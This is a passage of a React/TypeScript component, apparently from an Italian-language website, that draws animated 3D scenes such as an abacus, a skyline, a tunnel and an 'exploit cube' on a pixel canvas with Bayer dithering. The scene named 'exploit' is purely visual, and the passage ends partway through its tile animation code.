"use client";

import React, { useCallback, useEffect, useMemo, useRef, useState } from "react";
import Link from "next/link";

const PHONE_NUMBER = "tel:+393711500055";

/* ============================================================================
 * DESIGN SYSTEM — ESTRATTO DAL REEL "LARACON AU 26 / DEV.OLUTION" (DflaJLXPqWW)
 * Zero sfumature continue · Zero border-radius · 4+1 toni piatti · Bayer Dither
 * ========================================================================== */
const PALETTE = {
  bg: "#010101",
  ink: "#C8C7C9",
  blue: "#3E3EE0",
  red: "#C50B3F",
  slate: "#262428",
  dim: "#7C797A",
} as const;

const DISPLAY_FONT = "var(--font-antonio), Impact, 'Arial Narrow', sans-serif";
const MONO_FONT = "var(--font-geist-mono), ui-monospace, SFMono-Regular, monospace";

/* Matrice di Bayer 8x8 normalizzata [0..63] per halftone ordinato a pixel fissi */
const BAYER_8X8 = [
  [0, 32, 8, 40, 2, 34, 10, 42],
  [48, 16, 56, 24, 50, 18, 58, 26],
  [12, 44, 4, 36, 14, 46, 6, 38],
  [60, 28, 52, 20, 62, 30, 54, 22],
  [3, 35, 11, 43, 1, 33, 9, 41],
  [51, 19, 59, 27, 49, 17, 57, 25],
  [15, 47, 7, 39, 13, 45, 5, 37],
  [63, 31, 55, 23, 61, 29, 53, 21],
];

export type DitherSceneKind =
  | "abacus"
  | "matrix"
  | "laptop"
  | "skyline"
  | "wave"
  | "stairs"
  | "tunnel"
  | "cube"
  | "exploitCube"
  | "maze"
  | "cluster"
  | "dome"
  | "torus"
  | "star"
  | "hollowCube"
  | "sunDome";

interface PixelDitherCanvasProps {
  kind: DitherSceneKind;
  color: string;
  bgColor?: string;
  width?: number;
  height?: number;
  cellSize?: number;
  interactive?: boolean;
  explode?: number;
  className?: string;
  style?: React.CSSProperties;
}

/* Proiezione 3D -> Griglia luminanza discreta senza allocazioni per frame */
type Vec3 = [number, number, number];

function rotatePoint(x: number, y: number, z: number, rx: number, ry: number): Vec3 {
  const cosY = Math.cos(ry);
  const sinY = Math.sin(ry);
  const x1 = x * cosY - z * sinY;
  const z1 = x * sinY + z * cosY;

  const cosX = Math.cos(rx);
  const sinX = Math.sin(rx);
  const y2 = y * cosX - z1 * sinX;
  const z2 = y * sinX + z1 * cosX;

  return [x1, y2, z2];
}

function splatPoint(
  buf: Float32Array,
  zBuf: Float32Array,
  cols: number,
  rows: number,
  px: number,
  py: number,
  pz: number,
  val: number,
  radius = 0,
  colorBuf?: Uint8Array,
  colorId = 0,
  replaceCloser = false
) {
  const gx = Math.round(px);
  const gy = Math.round(py);
  for (let dy = -radius; dy <= radius; dy++) {
    const yy = gy + dy;
    if (yy < 0 || yy >= rows) continue;
    for (let dx = -radius; dx <= radius; dx++) {
      const xx = gx + dx;
      if (xx < 0 || xx >= cols) continue;
      if (radius > 0 && dx * dx + dy * dy > radius * radius + 0.35) continue;
      const idx = yy * cols + xx;
      if (replaceCloser) {
        if (pz > zBuf[idx] + 0.03) {
          zBuf[idx] = pz;
          buf[idx] = val;
          if (colorBuf) colorBuf[idx] = colorId;
        } else if (pz >= zBuf[idx] - 0.06) {
          zBuf[idx] = Math.max(zBuf[idx], pz);
          if (val >= buf[idx]) {
            buf[idx] = val;
            if (colorBuf) colorBuf[idx] = colorId;
          } else if (colorBuf && colorId > colorBuf[idx]) {
            colorBuf[idx] = colorId;
          }
        }
      } else if (pz >= zBuf[idx] - 0.15) {
        zBuf[idx] = Math.max(zBuf[idx], pz);
        if (val > buf[idx]) {
          buf[idx] = val;
          if (colorBuf) colorBuf[idx] = colorId;
        }
      }
    }
  }
}

function drawLine3D(
  buf: Float32Array,
  zBuf: Float32Array,
  cols: number,
  rows: number,
  a: Vec3,
  b: Vec3,
  rx: number,
  ry: number,
  scale: number,
  cx: number,
  cy: number,
  lum: number,
  radius = 0,
  colorBuf?: Uint8Array,
  colorId = 0,
  replaceCloser = false
) {
  const p1 = rotatePoint(a[0], a[1], a[2], rx, ry);
  const p2 = rotatePoint(b[0], b[1], b[2], rx, ry);
  const steps = Math.max(8, Math.ceil(Math.hypot((p2[0] - p1[0]) * scale, (p2[1] - p1[1]) * scale) * 1.4));
  for (let i = 0; i <= steps; i++) {
    const t = i / steps;
    const x = p1[0] + (p2[0] - p1[0]) * t;
    const y = p1[1] + (p2[1] - p1[1]) * t;
    const z = p1[2] + (p2[2] - p1[2]) * t;
    const persp = 4.2 / (4.2 - Math.min(3.3, z) * 0.42);
    const sx = cx + x * scale * persp;
    const sy = cy + y * scale * persp;
    const shade = Math.min(1, lum * (0.65 + (z + 1.2) * 0.28));
    splatPoint(buf, zBuf, cols, rows, sx, sy, z, shade, radius, colorBuf, colorId, replaceCloser);
  }
}

function drawFilledBox3D(
  buf: Float32Array,
  zBuf: Float32Array,
  cols: number,
  rows: number,
  center: Vec3,
  half: Vec3,
  rx: number,
  ry: number,
  scale: number,
  cx: number,
  cy: number,
  density = 12,
  explodeOffset = 0
) {
  // Campiona le 6 facce del parallelepipedo in object space con shading direzionale netto
  const faces: Array<{ normal: Vec3; u: Vec3; v: Vec3; fixed: Vec3; light: number }> = [
    { normal: [0, 0, 1], u: [1, 0, 0], v: [0, 1, 0], fixed: [0, 0, half[2] + explodeOffset], light: 0.96 },
    { normal: [0, 0, -1], u: [1, 0, 0], v: [0, 1, 0], fixed: [0, 0, -half[2] - explodeOffset], light: 0.38 },
    { normal: [1, 0, 0], u: [0, 0, 1], v: [0, 1, 0], fixed: [half[0] + explodeOffset, 0, 0], light: 0.78 },
    { normal: [-1, 0, 0], u: [0, 0, 1], v: [0, 1, 0], fixed: [-half[0] - explodeOffset, 0, 0], light: 0.28 },
    { normal: [0, -1, 0], u: [1, 0, 0], v: [0, 0, 1], fixed: [0, -half[1] - explodeOffset, 0], light: 0.88 },
    { normal: [0, 1, 0], u: [1, 0, 0], v: [0, 0, 1], fixed: [0, half[1] + explodeOffset, 0], light: 0.22 },
  ];

  for (const face of faces) {
    const rn = rotatePoint(face.normal[0], face.normal[1], face.normal[2], rx, ry);
    if (explodeOffset < 0.04 && rn[2] < -0.15) continue; // Back-face culling solo quando è chiuso
    const lDot = Math.max(0.18, Math.abs(rn[0] * 0.45 - rn[1] * 0.55 + rn[2] * 0.72));
    const val = Math.min(1, face.light * 0.45 + lDot * 0.65);

    const suMax = face.u[0] ? half[0] : face.u[1] ? half[1] : half[2];
    const svMax = face.v[0] ? half[0] : face.v[1] ? half[1] : half[2];
    const stepsU = Math.max(4, Math.ceil(suMax * density));
    const stepsV = Math.max(4, Math.ceil(svMax * density));

    for (let iu = 0; iu <= stepsU; iu++) {
      const fu = -1 + (2 * iu) / stepsU;
      for (let iv = 0; iv <= stepsV; iv++) {
        const fv = -1 + (2 * iv) / stepsV;
        const ox = center[0] + face.fixed[0] + face.u[0] * suMax * fu + face.v[0] * svMax * fv;
        const oy = center[1] + face.fixed[1] + face.u[1] * suMax * fu + face.v[1] * svMax * fv;
        const oz = center[2] + face.fixed[2] + face.u[2] * suMax * fu + face.v[2] * svMax * fv;

        const rp = rotatePoint(ox, oy, oz, rx, ry);
        const persp = 4.5 / (4.5 - rp[2] * 0.4);
        const sx = cx + rp[0] * scale * persp;
        const sy = cy + rp[1] * scale * persp;

        const isEdge = iu === 0 || iu === stepsU || iv === 0 || iv === stepsV;
        splatPoint(buf, zBuf, cols, rows, sx, sy, rp[2], isEdge ? Math.min(1, val + 0.16) : val, 0);
      }
    }
  }
}

function drawRotatedBox3D(
  buf: Float32Array,
  zBuf: Float32Array,
  cols: number,
  rows: number,
  center: Vec3,
  half: Vec3,
  boxRx: number,
  boxRy: number,
  rx: number,
  ry: number,
  scale: number,
  cx: number,
  cy: number,
  density = 16,
  lumBoost = 0,
  colorBuf?: Uint8Array,
  colorId = 0,
  replaceCloser = true
) {
  const faces: Array<{ normal: Vec3; u: Vec3; v: Vec3; fixed: Vec3; light: number }> = [
    { normal: [0, 0, 1], u: [1, 0, 0], v: [0, 1, 0], fixed: [0, 0, half[2]], light: 0.96 },
    { normal: [0, 0, -1], u: [1, 0, 0], v: [0, 1, 0], fixed: [0, 0, -half[2]], light: 0.44 },
    { normal: [1, 0, 0], u: [0, 0, 1], v: [0, 1, 0], fixed: [half[0], 0, 0], light: 0.8 },
    { normal: [-1, 0, 0], u: [0, 0, 1], v: [0, 1, 0], fixed: [-half[0], 0, 0], light: 0.4 },
    { normal: [0, -1, 0], u: [1, 0, 0], v: [0, 0, 1], fixed: [0, -half[1], 0], light: 0.88 },
    { normal: [0, 1, 0], u: [1, 0, 0], v: [0, 0, 1], fixed: [0, half[1], 0], light: 0.34 },
  ];

  for (const face of faces) {
    const ln = rotatePoint(face.normal[0], face.normal[1], face.normal[2], boxRx, boxRy);
    const rn = rotatePoint(ln[0], ln[1], ln[2], rx, ry);
    if (rn[2] < -0.18) continue;
    const lDot = Math.max(0.24, Math.abs(rn[0] * 0.45 - rn[1] * 0.55 + rn[2] * 0.72));
    const val = Math.min(0.92, face.light * 0.4 + lDot * 0.55 + lumBoost);

    const suMax = face.u[0] ? half[0] : face.u[1] ? half[1] : half[2];
    const svMax = face.v[0] ? half[0] : face.v[1] ? half[1] : half[2];
    const stepsU = Math.max(4, Math.ceil(suMax * density));
    const stepsV = Math.max(4, Math.ceil(svMax * density));

    for (let iu = 0; iu <= stepsU; iu++) {
      const fu = -1 + (2 * iu) / stepsU;
      for (let iv = 0; iv <= stepsV; iv++) {
        const fv = -1 + (2 * iv) / stepsV;
        const lx = face.fixed[0] + face.u[0] * suMax * fu + face.v[0] * svMax * fv;
        const ly = face.fixed[1] + face.u[1] * suMax * fu + face.v[1] * svMax * fv;
        const lz = face.fixed[2] + face.u[2] * suMax * fu + face.v[2] * svMax * fv;
        const br = rotatePoint(lx, ly, lz, boxRx, boxRy);
        const rp = rotatePoint(center[0] + br[0], center[1] + br[1], center[2] + br[2], rx, ry);
        const persp = 4.5 / (4.5 - Math.min(3.4, rp[2]) * 0.4);
        const sx = cx + rp[0] * scale * persp;
        const sy = cy + rp[1] * scale * persp;
        const isEdge = iu === 0 || iu === stepsU || iv === 0 || iv === stepsV;
        splatPoint(
          buf,
          zBuf,
          cols,
          rows,
          sx,
          sy,
          rp[2],
          isEdge ? Math.min(1, val + 0.22) : val,
          0,
          colorBuf,
          colorId,
          replaceCloser
        );
      }
    }
  }
}

function drawQuadZ3D(
  buf: Float32Array,
  zBuf: Float32Array,
  cols: number,
  rows: number,
  x0: number,
  x1: number,
  y0: number,
  y1: number,
  z: number,
  rx: number,
  ry: number,
  scale: number,
  cx: number,
  cy: number,
  val: number,
  rimHighlight: number,
  density = 15,
  colorBuf?: Uint8Array,
  colorId = 0
) {
  const stepsX = Math.max(3, Math.ceil(Math.abs(x1 - x0) * density));
  const stepsY = Math.max(3, Math.ceil(Math.abs(y1 - y0) * density));
  for (let ix = 0; ix <= stepsX; ix++) {
    const x = x0 + ((x1 - x0) * ix) / stepsX;
    for (let iy = 0; iy <= stepsY; iy++) {
      const y = y0 + ((y1 - y0) * iy) / stepsY;
      const rp = rotatePoint(x, y, z, rx, ry);
      const persp = 4.5 / (4.5 - Math.min(3.4, rp[2]) * 0.4);
      const sx = cx + rp[0] * scale * persp;
      const sy = cy + rp[1] * scale * persp;
      const isOuter = ix === 0 || ix === stepsX || iy === 0 || iy === stepsY;
      splatPoint(
        buf,
        zBuf,
        cols,
        rows,
        sx,
        sy,
        rp[2],
        isOuter ? Math.min(1, val + rimHighlight) : val,
        0,
        colorBuf,
        colorId,
        true
      );
    }
  }
}

function renderSceneToBuffer(
  kind: DitherSceneKind,
  buf: Float32Array,
  zBuf: Float32Array,
  cols: number,
  rows: number,
  t: number,
  mx: number,
  my: number,
  explode = 0,
  cycle = 0,
  colorBuf?: Uint8Array
) {
  buf.fill(0);
  zBuf.fill(-1e9);
  if (colorBuf) colorBuf.fill(0);

  const cx = cols * 0.5;
  const cy = rows * 0.5;
  const baseScale = Math.min(cols, rows) * 0.32;

  if (kind === "abacus") {
    const rx = 0.42 + my * 0.25;
    const ry = Math.sin(t * 0.65) * 0.55 + mx * 0.45;
    const s = baseScale * 0.92;
    // Cornice rettangolare + barra divisoria
    drawLine3D(buf, zBuf, cols, rows, [-1.1, -0.75, 0], [1.1, -0.75, 0], rx, ry, s, cx, cy, 0.95, 1);
    drawLine3D(buf, zBuf, cols, rows, [-1.1, 0.75, 0], [1.1, 0.75, 0], rx, ry, s, cx, cy, 0.95, 1);
    drawLine3D(buf, zBuf, cols, rows, [-1.1, -0.75, 0], [-1.1, 0.75, 0], rx, ry, s, cx, cy, 0.95, 1);
    drawLine3D(buf, zBuf, cols, rows, [1.1, -0.75, 0], [1.1, 0.75, 0], rx, ry, s, cx, cy, 0.95, 1);
    drawLine3D(buf, zBuf, cols, rows, [-1.1, -0.22, 0], [1.1, -0.22, 0], rx, ry, s, cx, cy, 0.9, 1);

    // 7 colonne di grani dell'abaco che scorrono
    for (let c = -3; c <= 3; c++) {
      const bx = c * 0.28;
      drawLine3D(buf, zBuf, cols, rows, [bx, -0.7, 0], [bx, 0.7, 0], rx, ry, s, cx, cy, 0.48, 0);
      const slide = Math.sin(t * 1.6 + c * 0.7) * 0.12;
      const beadPositions = [-0.48 + slide * 0.4, 0.1 + slide, 0.35 + slide * 0.5, 0.56];
      for (const by of beadPositions) {
        const rp = rotatePoint(bx, by, 0, rx, ry);
        const persp = 4.2 / (4.2 - rp[2] * 0.4);
        splatPoint(buf, zBuf, cols, rows, cx + rp[0] * s * persp, cy + rp[1] * s * persp, rp[2], 0.95, 1);
      }
    }
    return;
  }

  if (kind === "matrix") {
    const rx = 0.55 + my * 0.25;
    const ry = t * 0.45 + mx * 0.5;
    const s = baseScale * 0.85;
    // Calcolatrice / Matrice API 3D con griglia di nodi
    drawFilledBox3D(buf, zBuf, cols, rows, [0, 0, 0], [0.85, 1.05, 0.14], rx, ry, s, cx, cy, 14);
    for (let r = -2; r <= 2; r++) {
      for (let c = -2; c <= 2; c++) {
        const pulse = Math.sin(t * 3 + r + c) > 0.2 ? 1 : 0.42;
        const rp = rotatePoint(c * 0.28, r * 0.3 + 0.15, 0.18, rx, ry);
        const persp = 4.5 / (4.5 - rp[2] * 0.4);
        splatPoint(buf, zBuf, cols, rows, cx + rp[0] * s * persp, cy + rp[1] * s * persp, rp[2] + 0.2, pulse, 1);
      }
    }
    return;
  }

  if (kind === "laptop") {
    const rx = 0.32 + my * 0.28;
    const ry = -0.45 + Math.sin(t * 0.6) * 0.45 + mx * 0.5;
    const s = baseScale * 0.9;
    // Base tastiera (inclinata)
    drawFilledBox3D(buf, zBuf, cols, rows, [0, 0.48, 0.45], [0.98, 0.05, 0.65], rx, ry, s, cx, cy, 14);
    // Schermo verticale aperto dietro
    drawFilledBox3D(buf, zBuf, cols, rows, [0, -0.18, -0.22], [0.98, 0.62, 0.04], rx, ry, s, cx, cy, 14);
    // Rettangolo interno display luminoso
    drawLine3D(buf, zBuf, cols, rows, [-0.82, -0.66, -0.17], [0.82, -0.66, -0.17], rx, ry, s, cx, cy, 1.0, 0);
    drawLine3D(buf, zBuf, cols, rows, [-0.82, 0.26, -0.17], [0.82, 0.26, -0.17], rx, ry, s, cx, cy, 1.0, 0);
    return;
  }

  if (kind === "skyline") {
    const buildings = [
      { x: 0.04, w: 0.09, h: 0.52 },
      { x: 0.14, w: 0.08, h: 0.38 },
      { x: 0.23, w: 0.11, h: 0.72 },
      { x: 0.35, w: 0.07, h: 0.44 },
      { x: 0.43, w: 0.12, h: 0.86 },
      { x: 0.56, w: 0.09, h: 0.6 },
      { x: 0.66, w: 0.1, h: 0.78 },
      { x: 0.77, w: 0.08, h: 0.48 },
      { x: 0.86, w: 0.1, h: 0.66 },
    ];
    for (let gy = 0; gy < rows; gy++) {
      const ny = 1 - gy / rows;
      for (let gx = 0; gx < cols; gx++) {
        const nx = gx / cols;
        if (gy === rows - 2) {
          buf[gy * cols + gx] = 0.95;
          continue;
        }
        for (let b = 0; b < buildings.length; b++) {
          const bld = buildings[b];
          const animatedH = bld.h * (0.85 + 0.12 * Math.sin(t * 1.4 + b * 0.7));
          if (nx >= bld.x && nx <= bld.x + bld.w && ny <= animatedH) {
            const relX = (nx - bld.x) / bld.w;
            const isBorder = relX < 0.12 || relX > 0.88 || ny > animatedH - 0.04;
            const windowLit = Math.floor(nx * 45) % 2 === 0 && Math.floor(ny * 36) % 2 === 0;
            buf[gy * cols + gx] = isBorder ? 0.96 : windowLit ? 0.72 : 0.28;
          }
        }
      }
    }
    return;
  }

  if (kind === "wave") {
    for (let gy = 0; gy < rows; gy++) {
      const ny = gy / rows;
      for (let gx = 0; gx < cols; gx++) {
        const nx = gx / cols;
        const crestX = 0.48 + Math.sin(t * 1.1) * 0.04;
        const dx = nx - crestX;
        const arch = 0.28 + 0.48 * Math.pow(Math.max(0, 1 - Math.abs(nx - 0.52) * 1.45), 1.4);
        const curl = Math.exp(-((dx + 0.04) * (dx + 0.04) * 18 + (ny - 0.42) * (ny - 0.42) * 24));
        const swirl = 0.5 + 0.5 * Math.sin(nx * 14 - ny * 11 - t * 2.2);
        const waveLine = Math.abs(ny - (1 - arch)) < 0.09 ? 0.95 : ny > 1 - arch ? 0.55 * swirl : 0;
        const foam = curl * 0.85;
        const val = Math.max(waveLine, foam);
        if (val > 0.1) buf[gy * cols + gx] = Math.min(1, val);
      }
    }
    return;
  }

  if (kind === "stairs") {
    const steps = 6;
    for (let gy = 0; gy < rows; gy++) {
      const ny = gy / rows;
      for (let gx = 0; gx < cols; gx++) {
        const nx = gx / cols;
        const stepIdx = Math.floor((1 - ny) * steps + nx * 2.2) - 1;
        const diagY = 1 - nx * 0.78;
        if (ny > diagY - 0.14) {
          const depth = Math.max(0, 1 - Math.abs(ny - diagY) * 2.8);
          const riser = ((Math.floor(ny * steps * 2.2) % 2 === 0) ? 0.85 : 0.35) * (0.65 + 0.35 * Math.sin(t + stepIdx * 0.4));
          buf[gy * cols + gx] = Math.min(1, depth * riser + 0.15);
        }
      }
    }
    return;
  }

  if (kind === "tunnel") {
    const shiftX = (mx - 0) * 0.12;
    const shiftY = (my - 0) * 0.12;
    for (let gy = 0; gy < rows; gy++) {
      const y = (gy / rows - 0.5) * 2 - shiftY;
      for (let gx = 0; gx < cols; gx++) {
        const x = (gx / cols - 0.5) * 2 * (cols / rows) - shiftX;
        // Distanza ottagonale L_inf / Chebyshev combinata
        const dist = Math.max(Math.abs(x), Math.abs(y), (Math.abs(x) + Math.abs(y)) * 0.707);
        if (dist < 0.18) continue;
        const pulse = Math.sin(1 / (dist + 0.08) * 1.9 - t * 3.4);
        const vignette = Math.min(1, (dist - 0.18) * 1.15);
        const lum = vignette * (0.48 + 0.52 * Math.max(0, pulse));
        if (lum > 0.1) buf[gy * cols + gx] = lum;
      }
    }
    return;
  }

  if (kind === "cube") {
    const rx = 0.48 + my * 0.4 + Math.sin(t * 0.7) * 0.18;
    const ry = t * 0.65 + mx * 0.6;
    drawFilledBox3D(
      buf,
      zBuf,
      cols,
      rows,
      [0, 0, 0],
      [0.76, 0.76, 0.76],
      rx,
      ry,
      baseScale,
      cx,
      cy,
      14,
      explode * 0.42
    );
    return;
  }

  if (kind === "exploitCube") {
    // Cubo già esploso identico al modello di Fase 01 (DECONSTRUCT) ma viola:
    // - Pezzo bianco (tassello) già staccato fuori dal cubo
    // - Animazione continua del tassello bianco che entra al centro -> apre un buco netto
    // - Flusso di dati cibernetici bianchi+viola che fuoriesce in 3D dal buco nello stesso stile Bayer
    const ease = (v: number) => {
      const c = Math.max(0, Math.min(1, v));
      return c * c * (3 - 2 * c);
    };
    const act = Math.max(0, Math.min(1, explode));
    const p = act > 0.02 ? cycle : 0;

    // Angolazione 3/4 identica al cubo esploso di Fase 01, mantenendo la faccia frontale (+Z) leggibile
    const rx = 0.44 + my * 0.34 + Math.sin(t * 0.7) * 0.14;
    const ry = -0.56 + Math.sin(t * 0.56) * 0.24 + mx * 0.48;

    const cubeCx = cols * 0.42;
    const cubeCy = cy;
    const cubeScale = baseScale * 0.88;

    // Il cubo è GIÀ QUELLO ESPLOSO fin dall'inizio (explodeOffset = 0.42 come Fase 01)
    const h = 0.76;
    const exp = 0.42;
    const wallDist = h + exp; // 1.18

    // Apertura del buco centrale dopo inserimento del tassello bianco (p: 0.40..0.54 aperto, 0.88..0.98 richiude)
    const openIn = p >= 0.4 ? ease((p - 0.4) / 0.12) : 0;
    const closeOut = p >= 0.88 ? ease((p - 0.88) / 0.1) : 0;
    const holeOpen = Math.max(0, openIn * (1 - closeOut)) * act;
    const holeHalf = 0.43 * holeOpen;

    // 1. Cinque pareti del cubo esploso in viola Bayer identiche al reticolo arioso di Fase 01
    const outerFaces: Array<{ normal: Vec3; u: Vec3; v: Vec3; fixed: Vec3; light: number }> = [
      { normal: [0, 0, -1], u: [1, 0, 0], v: [0, 1, 0], fixed: [0, 0, -wallDist], light: 0.38 },
      { normal: [1, 0, 0], u: [0, 0, 1], v: [0, 1, 0], fixed: [wallDist, 0, 0], light: 0.76 },
      { normal: [-1, 0, 0], u: [0, 0, 1], v: [0, 1, 0], fixed: [-wallDist, 0, 0], light: 0.3 },
      { normal: [0, -1, 0], u: [1, 0, 0], v: [0, 0, 1], fixed: [0, -wallDist, 0], light: 0.86 },
      { normal: [0, 1, 0], u: [1, 0, 0], v: [0, 0, 1], fixed: [0, wallDist, 0], light: 0.24 },
    ];
    for (const face of outerFaces) {
      const rn = rotatePoint(face.normal[0], face.normal[1], face.normal[2], rx, ry);
      const lDot = Math.max(0.18, Math.abs(rn[0] * 0.45 - rn[1] * 0.55 + rn[2] * 0.72));
      const val = Math.min(0.84, face.light * 0.42 + lDot * 0.52);
      const steps = 11; // 12x12 punti come drawFilledBox3D(..., density=14) in Fase 01!
      for (let iu = 0; iu <= steps; iu++) {
        const fu = -1 + (2 * iu) / steps;
        for (let iv = 0; iv <= steps; iv++) {
          const fv = -1 + (2 * iv) / steps;
          const ox = face.fixed[0] + face.u[0] * h * fu + face.v[0] * h * fv;
          const oy = face.fixed[1] + face.u[1] * h * fu + face.v[1] * h * fv;
          const oz = face.fixed[2] + face.u[2] * h * fu + face.v[2] * h * fv;
          const rp = rotatePoint(ox, oy, oz, rx, ry);
          const persp = 4.5 / (4.5 - Math.min(3.4, rp[2]) * 0.4);
          const sx = cubeCx + rp[0] * cubeScale * persp;
          const sy = cubeCy + rp[1] * cubeScale * persp;
          const isEdge = iu === 0 || iu === steps || iv === 0 || iv === steps;
          splatPoint(
            buf,
            zBuf,
            cols,
            rows,
            sx,
            sy,
            rp[2],
            isEdge ? Math.min(0.98, val + 0.16) : val,
            0,
            colorBuf,
            0,
            true
          );
        }
      }
    }

    // 2. Maschera cavità nera del buco aperto: pulisce i pixel di sfondo dietro al foro centrale
    if (holeHalf > 0.05) {
      const clearLimit = Math.max(0.02, holeHalf - 0.04);
      const maskSteps = 22;
      for (let ix = 0; ix <= maskSteps; ix++) {
        const x = -clearLimit + (2 * clearLimit * ix) / maskSteps;
        for (let iy = 0; iy <= maskSteps; iy++) {
          const y = -clearLimit + (2 * clearLimit * iy) / maskSteps;
          const rp = rotatePoint(x, y, wallDist - 0.02, rx, ry);
          const persp = 4.5 / (4.5 - Math.min(3.4, rp[2]) * 0.4);
          const gx = Math.round(cubeCx + rp[0] * cubeScale * persp);
          const gy = Math.round(cubeCy + rp[1] * cubeScale * persp);
          if (gx >= 0 && gx < cols && gy >= 0 && gy < rows) {
            const idx = gy * cols + gx;
            if (zBuf[idx] < rp[2] + 0.08) {
              buf[idx] = 0;
              zBuf[idx] = -0.35;
              if (colorBuf) colorBuf[idx] = 0;
            }
          }
        }
      }
    }

    // 3. Parete frontale (+Z): dithering viola Bayer pulito con buco centrale quando aperto
    const frontVal = 0.68; // Livello 0.68 => trama Bayer a croci/quadrati netti (non blocco piatto)
    if (holeHalf < 0.03) {
      drawQuadZ3D(buf, zBuf, cols, rows, -h, h, -h, h, wallDist, rx, ry, cubeScale, cubeCx, cubeCy, frontVal, 0.24, 15, colorBuf, 0);
    } else {
      drawQuadZ3D(buf, zBuf, cols, rows, -h, h, -h, -holeHalf, wallDist, rx, ry, cubeScale, cubeCx, cubeCy, frontVal, 0.24, 15, colorBuf, 0);
      drawQuadZ3D(buf, zBuf, cols, rows, -h, h, holeHalf, h, wallDist, rx, ry, cubeScale, cubeCx, cubeCy, frontVal, 0.24, 15, colorBuf, 0);
      drawQuadZ3D(buf, zBuf, cols, rows, -h, -holeHalf, -holeHalf, holeHalf, wallDist, rx, ry, cubeScale, cubeCx, cubeCy, frontVal, 0.24, 15, colorBuf, 0);
      drawQuadZ3D(buf, zBuf, cols, rows, holeHalf, h, -holeHalf, holeHalf, wallDist, rx, ry, cubeScale, cubeCx, cubeCy, frontVal, 0.24, 15, colorBuf, 0);

      // Bordo luminoso del buco + spessore 3D interno della parete forata
      const rimZ0 = wallDist - 0.12;
      const rimPts: Vec3[] = [
        [-holeHalf, -holeHalf, wallDist + 0.02],
        [holeHalf, -holeHalf, wallDist + 0.02],
        [holeHalf, holeHalf, wallDist + 0.02],
        [-holeHalf, holeHalf, wallDist + 0.02],
      ];
      for (let i = 0; i < 4; i++) {
        const a = rimPts[i];
        const b = rimPts[(i + 1) & 3];
        drawLine3D(buf, zBuf, cols, rows, a, b, rx, ry, cubeScale, cubeCx, cubeCy, 0.98, 0, colorBuf, 0, true);
        drawLine3D(
          buf,
          zBuf,
          cols,
          rows,
          [a[0], a[1], wallDist + 0.01],
          [a[0], a[1], rimZ0],
          rx,
          ry,
          cubeScale,
          cubeCx,
          cubeCy,
          0.74,
          0,
          colorBuf,
          0,
          true
        );
        drawLine3D(
          buf,
          zBuf,
          cols,
          rows,
          [a[0], a[1], rimZ0],
          [b[0], b[1], rimZ0],
          rx,
          ry,
          cubeScale,
          cubeCx,
          cubeCy,
          0.55,
          0,
          colorBuf,
          0,
          true
        );
      }
    }

    // Slot mirino centrale prima che entri il pezzo bianco
    if (act > 0.05 && p >= 0.08 && p < 0.4 && holeHalf < 0.05) {
      const ts = 0.22;
      const slotLum = 0.68 + 0.28 * Math.sin(t * 9);
      const tz = wallDist + 0.03;
      drawLine3D(buf, zBuf, cols, rows, [-ts, -ts, tz], [ts, -ts, tz], rx, ry, cubeScale, cubeCx, cubeCy, slotLum, 0, colorBuf, 1, true);
      drawLine3D(buf, zBuf, cols, rows, [ts, -ts, tz], [ts, ts, tz], rx, ry, cubeScale, cubeCx, cubeCy, slotLum, 0, colorBuf, 1, true);
      drawLine3D(buf, zBuf, cols, rows, [ts, ts, tz], [-ts, ts, tz], rx, ry, cubeScale, cubeCx, cubeCy, slotLum, 0, colorBuf, 1, true);
      drawLine3D(buf, zBuf, cols, rows, [-ts, ts, tz], [-ts, -ts, tz], rx, ry, cubeScale, cubeCx, cubeCy, slotLum, 0, colorBuf, 1, true);
    }

    // Impulso bianco d'inserimento quando il tassello colpisce il centro (p: 0.36..0.52)
    if (act > 0.05 && p >= 0.36 && p <= 0.52) {
      const shockT = (p - 0.36) / 0.16;
      const sr = 0.2 + ease(shockT) * 0.58;
      const sLum = (1 - shockT) * 0.98;
      const sz = wallDist + 0.04;
      drawLine3D(buf, zBuf, cols, rows, [-sr, -sr, sz], [sr, -sr, sz], rx, ry, cubeScale, cubeCx, cubeCy, sLum, 0, colorBuf, 1, true);
      drawLine3D(buf, zBuf, cols, rows, [sr, -sr, sz], [sr, sr, sz], rx, ry, cubeScale, cubeCx, cubeCy, sLum, 0, colorBuf, 1, true);
      drawLine3D(buf, zBuf, cols, rows, [sr, sr, sz], [-sr, sr, sz], rx, ry, cubeScale, cubeCx, cubeCy, sLum, 0, colorBuf, 1, true);
      drawLine3D(buf, zBuf, cols, rows, [-sr, sr, sz], [-sr, -sr, sz], rx, ry, cubeScale, cubeCx, cubeCy, sLum, 0, colorBuf, 1, true);
    }

    // 4. Pezzo BIANCO (tassello): flottante fuori dal cubo esploso -> si inserisce nel mezzo -> sblocca il buco
    let showTile = true;
    let tx = 1.06;
    let ty = -0.44 + Math.sin(t * 2.0) * 0.05;
    let tz = wallDist + 0.34;
    let tRx = 0.2 + t * 0.6;
    let tRy = t * 0.85;
    let tileScale = 1.0;

    if (act <= 0.02) {
      // A riposo: pezzo bianco già staccato e ben visibile fuori dal cubo viola esploso
      tx = 1.06;
      ty = -0.44 + Math.sin(t * 2.0) * 0.06;
      tz = wallDist + 0.32;
    } else if (p < 0.14) {
      const u = ease(p / 0.14);
      tx = 1.06 + (0.94 - 1.06) * u;
      ty = -0.44 + (-0.34 + 0.44) * u;
      tz = wallDist + 0.34 + 0.26 * u;
    } else if (p < 0.32) {
      // Arco fluido davanti al centro della faccia frontale
      const u = ease((p - 0.14) / 0.18);
      tx = 0.94 * (1 - u);
      ty = -0.34 * (1 - u);
      tz = wallDist + 0.6 + Math.sin(u * Math.PI) * 0.24;
      tRx = (0.2 + t * 0.6) * (1 - u);
      tRy = (t * 0.85) * (1 - u);
      drawLine3D(buf, zBuf, cols, rows, [tx, ty, tz], [0, 0, wallDist + 0.04], rx, ry, cubeScale, cubeCx, cubeCy, 0.48, 0, colorBuf, 1, true);
    } else if (p < 0.43) {
      // Inserimento netto nel mezzo (con breve sosta visibile al centro)
      const u = ease(Math.min(1, (p - 0.32) / 0.07));
      tx = 0;
      ty = 0;
      tz = wallDist + 0.6 - u * 0.56;
      tRx = 0;
      tRy = 0;
    } else if (p < 0.51) {
      // Spinge dentro il nucleo mentre il buco si apre
      const u = ease((p - 0.43) / 0.08);
      tx = 0;
      ty = 0;
      tz = wallDist + 0.04 - u * 0.55;
      tRx = u * 0.9;
      tRy = u * 1.1;
      tileScale = Math.max(0.24, 1 - u * 0.72);
    } else if (p >= 0.91) {
      const u = ease((p - 0.91) / 0.09);
      tx = 1.06;
